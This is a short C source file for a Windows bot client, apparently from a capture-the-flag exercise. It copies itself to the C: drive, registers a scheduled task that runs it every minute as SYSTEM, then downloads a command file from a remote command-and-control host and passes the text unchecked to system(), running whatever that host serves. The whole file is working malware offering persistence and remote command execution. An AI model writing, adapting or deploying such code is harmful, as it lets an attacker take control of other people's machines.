#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "curl/curl.h"

//$ gcc bot.c -x c -o bot.exe -DCURL_STATICLIB -Iinclude -Llib -lcurl -lwsock32 -lwinmm -lws2_32 -Wall

struct string {
  char *ptr;
  size_t len;
};

void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}

int main(int argc, char* argv[])
{
  char command[500];
  snprintf(command, sizeof command, "copy \"%s\" \"C:\\\"", argv[0]);
  system(command);
  char pathname[500];
  char *filename;
  filename=strrchr(argv[0], '\\');
  if (filename==NULL){filename=argv[0];} else { filename++;}
  snprintf(command, sizeof command, "SCHTASKS /Create /ST 00:00:00 /RU SYSTEM /TN BotTask /SC minute /MO 1 /TR \"C:\\%s\"", filename);
  system(command);

  
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if(curl) {
    struct string s;
    init_string(&s);

    curl_easy_setopt(curl, CURLOPT_URL, "http://botnetadmin.qctf.ru/cmd.txt");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    res = curl_easy_perform(curl);

    system(s.ptr);
    free(s.ptr);

    curl_easy_cleanup(curl);
  }
  return 0;
}